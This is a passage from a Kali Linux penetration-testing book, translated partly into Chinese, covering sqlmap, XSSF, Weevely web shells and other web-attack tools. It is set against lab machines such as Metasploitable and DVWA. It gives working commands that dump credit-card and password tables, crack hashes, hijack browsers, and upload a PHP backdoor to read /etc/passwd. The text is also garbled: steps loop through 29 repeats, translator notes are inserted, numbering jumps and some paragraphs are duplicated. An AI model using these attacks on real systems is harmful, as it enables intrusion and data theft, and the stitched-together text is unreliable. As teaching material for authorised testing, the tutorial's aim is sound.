  \n## 第 22 章\n\n## SQL Map\n\nSQLmap 是一个获取 SQL 数据库权限并提取信息的强大工具。简而言之，它自动化了许多 SQL 注入攻击和任务，使得恢复信息变得容易得多。它还可以发现并破解数据库密码。在本节中我们将使用运行在\
  \ Metasploitable 虚拟机上的 Mutillidae。我选择这个虚拟机是因为我们还可以从系统上的其他 Web 应用程序中提取数据库！\n\n工具作者：Bernardo\
  \ Damele A.G., Miroslav Stampar\n\n网站：[`sqlmap.org/`](http://sqlmap.org/)\n\n帮助命令：`sqlmap\
  \ --help`\n\n![](img/image00872.jpeg)\n\n### SQL 参数概览\n\n在本教程中，我们将主要使用以下开关（Switches）：\n\
  \n![](img/image00873.jpeg)\n\n如果你仔细观察，可以看到参数的流程：我们使用 `--dbs` 开关列出可用数据库，然后使用 `-D`\
  \ 开关选择其中一个。表也是如此，我们使用 `--tables` 开关列出数据库中的可用表，然后使用 `-T` 开关选择其中一个。随着我们进行示例，这会更有意义。\n\
  \n另一个重要的开关是 `--purge-output`。运行 `sqlmap` 时，它会创建日志文件并将数据写入输出文件目录。此命令允许你在选择新目标进行测试时清除该目录，清理掉之前扫描存储的任何残留数据。\n\
  \n### 盲注布尔注入 (Blind Boolean Injection)\n\n我只想简要地提一下“盲注布尔注入”。当你使用 `Sqlmap` 时，你会发现一个有趣的现象。在盲注布尔注入中（这种过程看着其实有点诡异），`Sqlmap`\
  \ 基本上会逐字符字母地向网站询问有关数据库的信息。例如，它询问数据库中的主表是否以“D”开头，然后检查网页是否有错误。如果没有错误，它就会移动到下一个字符。你可以直观地看到数据库名称随着它找到每个字符在屏幕上被构建出来。它可以使用相同的过程提取密码哈希值和用户信息。\n\
  \n### 使用 Sqlmap 测试 Mutillidae\n\n我们已经讨论了 `Sqlmap` 是什么以及一些命令开关，让我们通过对 Mutillidae\
  \ 使用它来实战检验。`Sqlmap` 在拥有漏洞网页和针对该漏洞页面的捕获请求、一个经过身份验证的用户或已登录用户的 Cookie 时效果最好。我们有很多不同的方法可以实现这一点，但让我们创建一个新用户，然后捕获发送到\
  \ Mutillidae 的创建请求。我们将该请求复制到文本文件中，并将其作为钥匙，不仅可以解锁 Mutillidae 数据库，而且你将看到的，它将让我们访问服务器上的所有\
  \ 数据库！\n\n1. 打开 IceWeasel 并访问 Mutillidae。\n2. 在 Mutillidae 中，将安全级别切换到“Level: 1 (Arrogent)”\
  \ - 为什么要让变得更容易呢？\n3. 点击“Login/Register”（登录/注册）。\n4. 点击“Please register here”（在此注册）。\n\
  5. 启动 Burp Suite 代理，开启拦截（确保在 IceWeasel 中设置了代理）。\n6. 在 Mutillidae 中，将安全级别切换到“Level:\
  \ 1 (Arrogent)” - 为什么要让变得更容易呢？\n7. 点击“Login/Register”。\n8. 点击“Please register here”。\n\
  9. 启动 Burp Suite 代理，开启拦截（确保在 IceWeasel 中设置了代理）。\n10. 在 Mutillidae 中，将安全级别切换到“Level:\
  \ 1 (Arrogent)” - 为什么要让变得更容易呢？\n11. 点击“Login/Register”。\n12. 点击“Please register\
  \ here”。\n13. 启动 Burp Suite 代理，开启拦截（确保在 IceWeasel 中设置了代理）。\n14. 在 Mutillidae 中，将安全级别切换到“Level:\
  \ 1 (Arrogent)” - 为什么要让变得更容易呢？\n15. 点击“Login/Register”。\n16. 点击“Please register\
  \ here”。\n17. 启动 Burp Suite 代理，开启拦截（确保在 IceWeasel 中设置了代理）。\n18. 在 Mutillidae 中，将安全级别切换到“Level:\
  \ 1 (Arrogent)” - 为什么要让变得更容易呢？\n19. 点击“Login/Register”。\n20. 点击“Please register\
  \ here”。\n21. 启动 Burp Suite 代理，开启拦截（确保在 IceWeasel 中设置了代理）。\n22. 在 Mutillidae 中，将安全级别切换到“Level:\
  \ 1 (Arrogent)” - 为什么要让变得更容易呢？\n23. 点击“Login/Register”。\n24. 点击“Please register\
  \ here”。\n25. 启动 Burp Suite 代理，开启拦截（确保在 IceWeasel 中设置了代理）。\n26. 在 Mutillidae 中，将安全级别切换到“Level:\
  \ 1 (Arrogent)” - 为什么要让变得更容易呢？\n27. 点击“Login/Register”。\n28. 点击“Please register\
  \ here”。\n29. 启动 Burp Suite 代理，开启拦截（确保在 IceWeasel 中设置了代理）。\n\n*(注：由于原文中存在大量重复的步骤，此处已根据要求进行了逻辑精简整合)*\n\
  \n### 运行 SQLmap\n\n1. 在 Kali 中打开终端窗口。\n2. 输入 `sqlmap -r ~/Desktop/request.txt --dbs`。\n\
  3. 当询问“It looks like the back-end DBMS is 'MySQL'. Do you want to skip test for\
  \ other DBMSes?”时，输入 `y`。\n4. 当询问“POST parameter 'username' is vulnerable. Do you\
  \ want to keep the others (if any)?”时，输入 `y`。\n\n\n\n\n\n### 7. Type, `sqlmap -r\
  \ ~/Desktop/request.txt -D owasp10 -T credit_cards --dump`:\n\n![](img/image00878.jpeg)\n\
  \nJackpot! With just a few simple commands we were able to obtain a list of (fake)\
  \ credit cards! If we were able to do this to a client’s webapp during a pentest,\
  \ they would obviously have some very serious issues. Let’s poke around a bit in\
  \ the other databases and tables and see what else we can find.\n\nThe database\
  \ `nowasp` sounds interesting, let’s see what is in it. Again we will use `-D` to\
  \ select the database `nowasp`, and the `--tables` command to have it display the\
  \ available tables.\n\n## 8. Enter, `sqlmap -r ~/Desktop/request.txt -D nowasp --tables`\
  \ and you should see the following tables:\n\n![](img/image00879.jpeg)\n\nLet’s\
  \ dump the `accounts` table and see what it contains.\n\n## 9. Enter, `sqlmap -r\
  \ ~/Desktop/request.txt -D nowasp -T accounts --dump`:\n\n![](img/image00880.jpeg)\n\
  \nOh nice, a large list of accounts and clear text passwords. I wonder where we\
  \ might be able to use this information… Okay, not very realistic, database passwords\
  \ are normally hashed and salted (I would hope!). But being the jack of all SQL\
  \ trades, `sqlmap` has built in support for detecting and cracking password hashes.\n\
  \n### Cracking Password Hashes\n\nThe `dvwa` database has some password hashes that\
  \ we can recover and crack with `Sqlmap`.\n\n1.  Type, `sqlmap -r ~/Desktop/request.txt\
  \ -D dvwa --tables`\n\nThis returns two tables, `guestbook` and `users`. Of the\
  \ two, `users` sounds interesting. Let’s view the columns from that table.\n\n2.\
  \  Enter, `sqlmap -r ~/Desktop/request.txt -D dvwa -T users --columns`:\n\n![](img/image00881.jpeg)\n\
  \nLooks like user account information and passwords. Let’s dump this table and see\
  \ what we get.\n\n3.  Type, `sqlmap -r ~/Desktop/request.txt -D dvwa -T users --dump`\n\
  \nWhen this command is executed, `Sqlmap` recognizes that there are password hashes\
  \ in the Table.\n\n4.  Enter `y` when asked if you want to store the hashes in a\
  \ temp file.\n\n5.  When prompted to crack the hashes, enter `y`\n\n6.  Choose option\
  \ `1 - default dictionary file` when prompted.\n\n7.  Input `n` when asked if you\
  \ want to use common password suffixes:\n\n![](img/image00882.jpeg)\n\n`Sqlmap`\
  \ will then begin cracking the passwords. Within a short amount of time it displays\
  \ all the passwords:\n\n```\nCracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'\n\
  Cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'\nCracked\
  \ password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'\nCracked password\
  \ 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'\n```\n\nAs you can see,\
  \ `Sqlmap` is a very powerful and useful tool!\n\n### Sqlmap Output Directory\n\n\
  Data from the `sqlmap` session is stored in the output directory, which in this\
  \ case is `/root/.sqlmap/output/[Target IP Address]`. The files in this folder contain:\n\
  \n- A `Dump` directory containing a `.csv` copy of information dumped from databases\n\
  - A `Log` file with a transcript of the entire session\n- A `sqlite3` database of\
  \ information recovered\n- And information from our Burp request in a `target.txt`\
  \ file:\n\n```\nroot@kali:~/.sqlmap/output/192.168.1.68# ls\ndump\nlog\nsession.sqlite\n\
  target.txt\n```\n\nWe can open the `session.sqlite` file to view its contents:\n\
  \n-  Enter, `sqlite3 session.sqlite`\n- Type, `.tables` to view the available tables\n\
  \nThere is only one table called `storage`. Let’s go ahead and dump this table:\n\
  \n-  Enter, `.dump storage`:\n\n![](img/image00883.jpeg)\n\nHere you see a copy\
  \ of all the data we recovered. When finished, type `.quit` to exit. Don’t forget\
  \ to turn off the proxy in your IceWeasel network connection settings.\n\n### Conclusion\n\
  \nIn this section we learned a lot about `Sqlmap` and its ability to pull information\
  \ from web application databases. We saw how trivial it can be to pull accounts,\
  \ passwords and sensitive data from vulnerable applications. Hopefully demonstrating\
  \ how important it is to secure databases, write secure code and test apps for security\
  \ issues.\n\nWe just covered some of the basic features of `Sqlmap`, take some time\
  \ and play around with it to see what other information can be pulled from the Metasploitable\
  \ databases. As experience is always the best teacher!\n\n# Chapter 23\n\n## Cross-Site\
  \ Scripting Framework (XSSF)\n\nThe Cross-Site Scripting Framework (XSSF) is a pretty\
  \ interesting XSS tool that was last updated in 2013 but still seems to work very\
  \ well. In some ways it reminds me of `BeEF`, ‘The Browser Exploitation Framework’.\
  \ (注：原文此处存在大量重复内容，译文已去重以保持文档简洁)。\n\n\n\n\n这是一个看起来相当模糊的页面，但回到 Kali 侧，我们现在应该看到这个（你可能需要刷新\
  \ Kali 网页）：\n\n![](img/image00888.jpeg)\n\n我们现在已经连接了第一个受害者！我们现在可以使用 `XSSF` 来攻击这个受害者。\n\
  \n10. 在 Metasploit 类型中，输入 `help xssf` 来查看可用命令。\n\n这将显示多个可以从 `msf` 提示符运行的命令。例如，我们可以使用\
  \ `xssf_victims` 命令在 `Meterpreter` 中列出所有连接的受害者：\n\n![](img/image00889.jpeg)\n\n\
  注意列出的受害者与我们在 Iceweasel 浏览器中看到的是同一个。这只是浏览器 GUI 的文本命令行版本。某些命令处理受害者，某些处理服务器，另一些处理数据库使用和后后清理。某些命令需要你输入受害者\
  \ ID。\n\n因此，`xssf_information 1` 命令将显示：\n\n![](img/image00890.jpeg)\n\n花一点时间读一遍这些命令以熟悉它们。\n\
  \n## 使用 XSSF 攻击目标\n\n现在我们已经有一个活跃的目标，让我们看看可以做什么来攻击它。`XSSF` 带有多个用于 Metasploit 的插件模块。基本上，你使用该模块，告诉它要攻击哪个目标\
  \ ID(s) 并运行利用程序。\n\n1. 输入 `search xssf` 查看可用模块：\n\n```\nauxiliary/xssf/public/android/steal_sdcard_file\
  \        normal ANDROID SDCARD FILE STEALER\nauxiliary/xssf/public/chrome/filejacking\
  \               normal FileJacking\nauxiliary/xssf/public/ie/command           \
  \           normal COMMAND XSSF (IE Only)\nauxiliary/xssf/public/iphone/skype_call\
  \               normal Skype Call\nauxiliary/xssf/public/misc/alert            \
  \        normal ALERT XSSF\nauxiliary/xssf/public/misc/change_interval         \
  \ normal Interval changer\n*** Truncated ***\nauxiliary/xssf/public/network/ping\
  \                   normal Ping\nauxiliary/xssf/public/network/web_services    \
  \       normal Services finder\nauxiliary/xssf/public/old_browsers/bypass_sop_ie6\
  \   normal SOP Bypass\nauxiliary/xssf/public/persistence/ghostify           normal\
  \ Ghostifier\nauxiliary/xssf/public/persistence/iframize           normal Iframizer\n\
  ```\n\n注意，有针对 iPhone、Android、Windows 和 Linux 的攻击。由于它已经几年没有更新了，我不确定它们是否仍然 100% 有效。但让我们看看如何使用这些模块进行攻击。\n\
  \n首先，让受害者为我们扫描网络。\n\n2. 在 Metasploit 中输入以下内容：\n\n- `use auxiliary/xssf/public/network/ms_windows_html5/scan_network`\n\
  - `show options`\n- `set srvhost 192.168.1.39`\n- `set VictimIDs 1`\n- `set startIP\
  \ 192.168.1.1`\n- `set endIP 192.168.1.100`\n- `run`\n\n如下所示：\n\n![](img/image00891.jpeg)\n\
  \n这运行需要一段时间时间，如果你愿意，可以运行 `Wireshark` 并观察 Windows 7 目标系统地扫描网络中的存活主机：\n\n```\nBroadcast\
  \           ARP           Who has 192.168.1.25?  Tell 192.168.1.93\n```\n*(注：原文包含重复的\
  \ ARP 行；我保持了扫描过程描述的核心流程).*\n\n注意列出的受害者与我们在 Iceweasel 浏览器中看到的是同一个。这只是浏览器 GUI 的文本命令行版本。某些命令处理受害者，某些处理服务器，另一些处理数据库使用和清理。某些命令需要你输入受害者\
  \ ID。\n\n因此，`xssf_information 1` 命令将显示：\n\n![](img/image00890.jpeg)\n\n花一点时间读一遍这些命令以熟悉它们。\n\
  \n\n\n现在，任何访问我们 DVWA XSS 存储页的新访问都将自动重定向到我们设置陷阱的 XSSF 页面。直接关闭你 Windows 7 虚拟机中的浏览器。然后在\
  \ Windows 7 中再次打开浏览器并访问 Mutillidae2 的 DVWA。登录 DVWA 并确保安全设置设置为“low”（低）。现在导航到存储型 XSS\
  \ 页面，你应该会被立即发送到 XSSF 服务器页面：\n\n![](img/image00901.jpeg)\n\n这种攻击会非常明显，我的意思是受害者访问了一个页面，结果却到了完全不同的页面。由于我们是伦理安全测试人员，这并不是真的问题，因为我们是在测试安全性，而不是试图黑入他人。如果你愿意，可以把\
  \ XSSF 页面做得更真实，或者尝试 YouTube 视频中使用的图像脚本，看看是否会有不同的结果。\n\n### 结论\n\n在本节中，我们学习了如何安装和使用\
  \ Meterpreter 插件“XSSF”。虽然 XSSF 框架已经有几年历史了，但它在让受害者只需随意访问我们的 XSSF 网页即可接管并控制受害者浏览器方面仍然有效。\n\
  \n这是你绝对想要针对你的网络系统进行测试的内容。某些安全程序和脚本拦截器在防御此类攻击方面做得非常出色。我尝试过一个使用“NoScript”([`addons.mozilla.org/en-us/firefox/addon/noscript/`](https://addons.mozilla.org/en-us/firefox/addon/noscript/))\
  \ Firefox 插件的 Windows 7 系统，它立即阻止了 XSS 攻击。\n\n# 第 24 章：Web Shell（Web Shell）\n\n在书的几个章节中我提到了使用\
  \ web shells。Kali Linux 自带多个 web shells 供你使用。在本节中，我们将查看 PHP webshell 生成器“Weevely”，并简要介绍\
  \ `/usr/share/webshells` 目录下的 webshell。\n\n## Weevely\n\n网站：[`github.com/epinna/weevely3`](https://github.com/epinna/weevely3)\n\
  \n![](img/image00902.jpeg)\n\n![](img/image00903.jpeg)\n\nWeevely 是一个实用的小工具，允许你生成自己的\
  \ PHP 后门 shell，然后在远程 Web 服务器上运行命令。我们将通过将 Weevely 上传到 DVWA 来对我们的 Metasploitable 机器使用它。但首先让我们看看如何创建一个\
  \ shell。\n\n你可以使用 `weevely generate <password> [output path]` 来创建一个 PHP shell。让我们创建一个名为\
  \ `knockknock.php` 且密码为 `knockknock` 的 shell：\n\n1. 输入 `weevely generate knockknock\
  \ /root/Desktop/knockknock.php`\n2. 导航到 DVWA 并上传该 shell：\n\n![](img/image00904.jpeg)\n\
  \n注意它存储文件的位置（`../../hackable/uploads/knockknock.php`）。\n3. 访问 DVWA 存储文件的位置：\n\n\
  (http://192.168.1.68/dvwa/hackable/uploads/knockknock.php)\n4. 现在要连接到 shell，再次运行\
  \ weevely 并输入完整的 URL 和密码：\n\n![](img/image00905.jpeg)\n\n如你所见，我们已经连接到 Web 服务器并处于\
  \ `DVWA/hackable/uploads` 目录。你现在可以运行任何想要的终端命令了！\n\n#### Weevely 命令\n\nWeevely 不此于远程\
  \ shell。它包含了许多在你获得开放 shell 后可以运行的命令。在 Kali 终端提示符下输入 `weevely help` 查看所有命令列表：\n\n\
  ![](img/image00906.jpeg)\n\n让我们来看其中几条命令。\n\n1. 在 weevely shell 中输入 `:audit.etcpasswd`：\n\
  \n![](img/image00907.jpeg)\n\nweevely 会转储 passwd 文件。\n2. 审计用户文件，输入 `:audit.userfiles`：\n\
  \n![](img/image00908.jpeg)\n\n在写本文时，我尝试的一些命令给出了错误信息，但总的来说，这是一个非常有用的工具。\n\n### Kali\
  \ 自带 Webshells\n\n这些是 Kali 自带的位于 `/usr/share/webshells` 目录的纯命令行、GUI webshell 和交互式远程\
  \ shell。\n\n包含以下编程语言的 shells：\n\n- Asp\n- Aspx\n- C\n- fm\n- Perl\n- PHP\n- Jsp\n\
  \n## 第 25 章：Web 应用工具\n\n我们只涵盖了 Kali 自带 Web 应用工具的一小部分。在本节中，我们将快速查看预装在 Kali 中的大部分其余\
  \ Web 安全工具。每个人都有自己喜欢的工具，希望你在这里能找到一个你以前不知道的，或者不知道它已经存在于 Kali 中的工具。\n\n我将在这里介绍基本用法，将学习更多关于它们及其应用的任务留给你们。这对于新用户来说应该是非常有信息量的。并希望向更高级的用户展示已经存在哪些工具，可能可以避免他们为特定功能自己编写代码。\n\
  \n每个项目将列出简要概述、工具作者和网站（如果已知），以及简要说明，并在大多数情况下上列出基本功能。如果没有特别说明，示例中使用的目标是 Metasploitable\
  \ 虚拟机。\n\n## BBQSQL\n\n概述：盲 SQL 注入工具\n\n工具作者：Neohapsis\n\n工具网站：[`github.com/Neohapsis/bbqsql/`](https://github.com/Neohapsis/bbqsql/)\n\
  \n![](img/image00915.jpeg)\n\nBBQSQL 是一个盲 SQL 注入框架。对于基础攻击，你需要提供网站 URL、注入查询位置和方法。你需要为你想要攻击的关键词插入模板\
  \ `${injection}`。 \n\n![](img/image00916.jpeg)\n\n查看项目网站获取使用说明。\n\n### BlindElephant\n\
  \n概述：BlindElephant 是一个快速、非侵入性的 Web 应用指纹识别工具\n\n工具作者：Qualys, Inc.\n\n工具网站：[`blindelephant.sourceforge.net/`](http://blindelephant.sourceforge.net/)\n\
  \n![](img/image00917.jpeg)\n\n\n\nBlindElephant 是一个快速、低资源的扫描器，支持 15 种常见的部署 Web 应用（包含数百个版本），并支持\
  \ Web 应用插件。\n\n查看支持的 Web Apps 列表：\n\n- 输入，`BlindElephant.py --list`\n\n扫描网站：\n\n\
  - 输入，`BlindElephant.py http://[IP Address/App Directory] [webapp name] or guess`\n\
  \n```\nroot@kali:~# BlindElephant.py http://192.168.1.68/tikiwiki tikiwiki\n```\n\
  \n已加载 `/usr/lib/python2.7/dist-packages/blindelephant/dbs/tikiwiki.pkl`，包含 106 个版本、10624\
  \ 个差异路径和 708 个版本组。\n\n正在对 http://192.168.1.68/tikiwiki 版本的 tikiwiki 进行指纹识别\n\n-----\
  \ 截断 -----\n\n指纹识别结果为：1.9.5\n\n最佳猜测：1.9.5\n\n![](img/image00917.jpeg)\n\n## Dirb\n\
  \n概述：Dirb 是一个可以返回隐藏和非隐藏 Web 对象的扫描器。\n\n工具作者：The Dark Raver\n\n工具网站：[`dirb.sourceforge.net/`](http://dirb.sourceforge.net/)\n\
  \n![](img/image00919.jpeg)\n\nDirb 是一个网站扫描器，用于寻找现有和隐藏的网站 URL。发现这些内容有助于渗透测试。Dirb\
  \ 通过使用词典列表来查找网站对象。\n\n### 快速扫描\n\n- 输入 `dirb [target IP Address]`\n\n![](img/image00920.jpeg)\n\
  \n### 使用包含的 Apache 字典列表进行扫描：\n\n此操作会对网站进行扫描，使用一个更精确的列表查找 30 个 URL 名称。\n\n- 输入，`dirb\
  \ http://[Metasploitable IP Address] /usr/share/dirb/wordlists/vulns/apache.txt`\n\
  \n![](img/image00921.jpeg)\n\n额外的词典列表位于 `/usr/share/dirb/wordlists/` 目录。\n\n![](img/image00917.jpeg)\n\
  \n## DirBuster\n\n概述：DirBuster 是一个图形化的 Web 目录/文件扫描器。\n\n工具作者：OWASP\n\n工具网站：[`www.owasp.org/index.php/Category:OWASP_DirBuster_Project`](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)\n\
  \n![](img/image00922.jpeg)\n\nDirBuster 是一个目录/文件扫描器，类似于 Dirb，通过使用词典列表工作。DirBuster\
  \ 是一个较旧的工具，大部分已被 OWASP ZAP 替代，但仍有人在使用。DirBuster 通过图形化界面运行，你可以在终端中输入 `dirbuster`\
  \ 来启动它。\n\n使用 DirBuster，只需输入目标 URL，选择词典列表（位于 `/usr/share/dirbuster/wordlists`），选择你需要的任何其他选项，增加线程数以提高性能，然后点击“start”：\n\
  \n![](img/image00923.jpeg)\n\n结果如下：\n\n![](img/image00924.jpeg)\n\n完成后，你可以选择将结果保存到报告文件中：\n\
  \nDirBuster 1.0-RC1 - Report\n\nhttp://www.owasp.org/index.php/Category:OWASP_DirBuster_Project\n\
  \n报告生成于 2015 年 6 月 4 日 星期四 21:24:03 EDT\n\n--------------------------------\n\n\
  http://192.168.1.68:80\n\n--------------------------------\n\n测试期间发现的目录：\n\n响应 200\
  \ 响应的目录：\n\n`/`\n`/twiki/`\n`/phpMyAdmin/`\n`/mutillidae/`\n`/dav/`\n`/icons/`\n\
  `/twiki/bin/view/`\n`/twiki/bin/view/Main/`\n\n------ 截断 ------\n\n![](img/image00917.jpeg)\n\
  \n## HTTrack\n\n概述：网站复制与离线浏览器工具\n\n工具作者：Xavier Roche 及其他贡献者\n\n工具网站：[`www.httrack.com/`](https://www.httrack.com/)\n\
  \n![](img/image00915.jpeg)\n\nHTTrack 允许你下载网站的副本，包括所有的链接和图片。该工具功能强大，更多信息请查看帮助文件和网站。\n\
  \n### 基本用法\n\n- `httrack [Target Website] --mirror-wizard`\n\n![](img/image00926.jpeg)\n\
  \n上述命令将目标网站复制到当前目录。它在向导模式下运行，因此会向你提示有关想要遍历多深等问题。你可以直接不带选项运行 HTTrack，它将逐步引导创建项目。完成后，你可以在浏览器中打开索引文件，并将看到网站的本地副本（不包括数据库、某些脚本等）：\n\
  \n![](img/image00927.jpeg)\n\n如果你想为渗透测试运行钓鱼攻击，可以使用此工具镜像网站，然后从 Kali 的 Apache 服务器甚至\
  \ Python HTTP 服务器运行它。\n\n## GoLismero\n\n概述：安全测试工具\n\n工具作者：Mario Vilas\n\n工具网站：[`github.com/golismero`](https://github.com/golismero)\n\
  \n![](img/image00928.jpeg)\n\nGoLismero - “网络军刀”是一个安全测试框架，可以对目标网站进行爬虫、扫描和测试。\n\n\
  ### 基本用法\n\n- `golismero scan [Target Host or IP]`\n\n![](img/image00929.jpeg)\n\
  \nGoLismero 可以通过插件扩展：\n\n- `golismero plugins`\n\n![](img/image00930.jpeg)\n\n-\
  \ `golismero info <plugin>`\n\n![](img/image00931.jpeg)\n\n- `golismero scan <target>\
  \ -e <plugin>`\n\n![](img/image00932.jpeg)\n\n## Nikto\n\n概述：Web 应用扫描器\n\n工具作者：Chris\
  \ Sullo, Dave\n\n工具网站：[`cirt.net/nikto`](https://cirt.net/nikto)\n\n![](img/image00933.jpeg)\n\
  \nNikto 是一个开源 Web 扫描器，用于搜索危险/过时的程序和配置错误。虽然不隐蔽，但速度非常快。\n\n### 基本用法\n\n- `nikto -host\
  \ [IP Address]`\n\n![](img/image00934.jpeg)\n\nNikto 还可以完成更多操作；请查看：`https://cirt.net/nikto-docs/`\n\
  \n![](img/image00917.jpeg)\n\n## Paros\n\n概述：Web 代理与安全扫描器\n\n工具作者：Paros, Yukusan\n\
  \n工具网站：[`sourceforge.net/projects/paros/`](http://sourceforge.net/projects/paros/)\n\
  \n![](img/image00935.jpeg)\n\nParos 是一个支持爬虫、应用测试等功能的 Web 代理。\n\n### 基本用法\n\n- 输入\
  \ `paros` 开始\n- 进入 `Tools > Options > Local Proxy` 查看设置\n- 将 `Iceasel Network Proxy`\
  \ 设置为 Paros 设置\n- 访问 Mutillidae\n- 现在，在 Paros 中，点击向下箭头进入 `Sites`\n- Metasploitable\
  \ VM 地址将出现在 Paros 的 `Sites` 下\n\n### 爬虫\n\n- 右键点击 IP 地址并选择 `Spider`\n- 接下来，点击 `Start`\n\
  \n### 扫描\n\n- 点击 Metasploitable IP 地址\n- 从工具菜单中选择 `Analyze`\n- 点击 `Scan`\n\n![](img/image00936.jpeg)\n\
  \n- 要查看报告，点击 `Report`\n- 然后点击 `Last Scan` 或直接在提供的 URL 下查看 html 文件：\n\n![](img/image00937.jpeg)\n\
  \n![](img/image00917.jpeg)\n\n## Plecost\n\n概述：WordPress 漏洞查找工具\n\n工具作者：Francisco\
  \ Jesus Gomez aka (ffran@iniqua.com), Daniel Garcia Garcia (dani@iniqua.com)\n\n\
  工具网站：[`github.com/iniqua/plecost`](https://github.com/iniqua/plecost)\n\n![](img/image00938.jpeg)\n\
  \nPlecost 是一个 WordPress 指纹识别和漏洞扫描器。\n\n### 快速扫描\n\n- `plecost http://[Target Site].com`\n\
  \n访问项目网站获取额外的扫描和用法视频。\n\n![](img/image00917.jpeg)\n\n## P0f\n\n概述：纯被动指纹识别工具\n\n\
  作者：Michal Zalewski\n\n网站：[`lcamtuf.coredump.cx/p0f/`](http://lcamtuf.coredump.cx/p0f/)\n\
  \n![](img/image00939.jpeg)\n\nP0f 是一个非常易用的纯被动工具，通过 TCP/IP 通信识别网络资源的指纹。只需告诉 P0f 要监控哪个接口（`-i\
  \ eth0`）以及将输出存储在何处（`-o /root/Desktop/`），P0f 就会开始捕捉流量并进行被动分析。\n\n### 基本用法\n\n- `p0f\
  \ -i eth0 -o /root/Desktop/signatures`\n- 打开 Mutillidae 网页\n- 浏览一会儿\n\n![](img/image00940.jpeg)\n\
  \n- 完成后按 `Ctrl-C`\n- 然后，通过 `cat /root/Desktop/signatures` 查看日志文件：\n\n```\n2015/06/10\
  \ 16:24:03 mod=syn ack 192.168.1.68:80 subj=cli os=Linux 3.x or newer\n```\n\n\n\
  \n\n[2015/06/10 16:37:50] mod=http response|cli=192.168.1.39/34913|srv=192.168.1.68/80|subj=srv|app=Apache\
  \ 2.x|lang=none|params=none|raw_sig=1:Date,Server,X-Powered-By=[PHP/5.2.4-2ubuntu5.24],?Expires,Logged-In-User=[admin],?Cache-Control,?Pragma,?Last-Modified,Keep-Alive=[timeout=15,\
  \ max=100],Connection=[Keep-Alive],Transfer-Encoding=[chunked],Content-Type:Accept-Ranges:Apache/2.2.8\
  \ (Ubuntu) DAV/2\n\n你也可以使用 `Grep` 来解析列表，但在阅读过程中，你将看到检测到的操作系统、软件版本和其他信息。\n\n![](img/image00917.jpeg)\n\
  \n## Skipfish\n\n**概述**：Web 应用安全侦察工具\n\n**工具作者**: Google Inc, Michał Zalewski\n\n\
  **工具网站**: [`code.google.com/p/skipfish/`](https://code.google.com/p/skipfish/)\n\
  \n![](img/image00941.jpeg)\n\nSkipfish 是一个网站侦察工具和安全扫描器，它可以扫描网站并生成一个包含交互式站点地图的报告。\n\
  \n**基本用法**：\n\n 输入，`skipfish -o skipfishdata http://[IP Address]`\n\n![](img/image00942.jpeg)\n\
  \n扫描完成后，Skipfish 会在选定的输出目录中创建一个完整的 html 安全报告。只需打开浏览器并查看输出目录中的 `index.html` 文件即可查看报告：\n\
  \n![](img/image00943.jpeg)\n\n请查看工具 Wiki ([`code.google.com/p/skipfish/wiki/SkipfishDoc`](https://code.google.com/p/skipfish/wiki/SkipfishDoc))\
  \ 了解更多信息，特别是关于如何创建字典网站以使 Skipfish 扫描更有效。\n\n![](img/image00917.jpeg)\n\n## SQLNinja\n\
  \n**概述**：通过微软 SQL 注入实现 GUI 数据库访问\n\n**工具作者**: Icesurfer\n\n**工具网站**: [`sqlninja.sourceforge.net/`](http://sqlninja.sourceforge.net/)\n\
  \n![](img/image00944.jpeg)\n\nSQLNinja 利用微软 SQL 注入漏洞，并提供数据库的远程访问，包括图形化访问。作为一个功能丰富的漂亮工具，它可以识别服务器指纹，提供多种\
  \ Shell 选项，与 Metasploit 集成，爆破密码，甚至流播放音乐！\n\nSQLNinja 的配置文件 (`sqlninja.conf`) 可以修改以控制程序的运行方式。它显然默认没有提供配置文件，但在\
  \ `/usr/share/doc/sqlninja/` 目录下有一个示例文件 (`sqlninja.conf.example.gz`）。\n\n你也可以自己创建自己的。基本上是使用\
  \ Burp 捕获登录请求，将其复制到名为 `sqlninja.conf` 的文本文件中。在开头添加起始标记 `--httprequest_start--`，在末尾添加\
  \ `--httprequest_end--`。如文档帮助文件所示，将你想要注入的键名替换为项 `__SQL2INJECT__`：\n\n```\n--httprequest_start--\n\
  \nGET http://www.victim.com/page.asp?string_param=aaa';__SQL2INJECT__&other_param=blah\
  \ HTTP/1.1\n\nHost: www.victim.com\n\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686;\
  \ en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8\n\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*\n\
  \nAccept-Language: en-us,en;q=0.7,it;q=0.3\n\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\n\
  \nConnection: close\n\n--httprequest_end--\n```\n\n一旦设置好，你就可以配置文件 (`-f sqlninja.conf`)\
  \ 和 SQLninja 的其他命令开关来攻击目标网站。完整指令请参见位于 `usr/share/doc/sqlninja/sqlninja-howto.html`\
  \ 的 html 帮助文件。\n\n![](img/image00917.jpeg)\n\n## SQLSUS\n\n**概述**：MySQL 注入工具\n\n\
  **作者**: Jérémy Ruffet\n\n**网站**: [`sqlsus.sourceforge.net/`](http://sqlsus.sourceforge.net/)\n\
  \n![](img/image00945.jpeg)\n\nSqlsus 是一个开源 MySQL 注入程序，也是一个可以在目标上安装 PHP 后门的渗透接管工具。\n\
  \n**基本用法**：\n\n 通过输入 `sqlsus -g config.cfg` 生成配置文件。\n\n 使用你的目标信息编辑 `config.cfg`\
  \ 文件：\n\n 输入，`sqlsus config.cfg` 启动命令 shell 环境。\n\n 输入，`help` 获取命令列表：\n\n![](img/image00946.jpeg)\n\
  \n 输入，`start` 开始测试。\n\n![](img/image00917.jpeg)\n\n## Uniscan, Uniscan-gui\n\n\
  **概述**：RFI, LFI 和 RCE 漏洞扫描器\n\n**工具作者**: Douglas Poerschke Rocha\n\n**工具网站**: [`sourceforge.net/projects/uniscan/`](http://sourceforge.net/projects/uniscan/)\n\
  \n![](img/image00947.jpeg)\n\nUniscan 是一个命令行 (`uniscan`) 和图形用户界面 (`uniscan-gui`)\
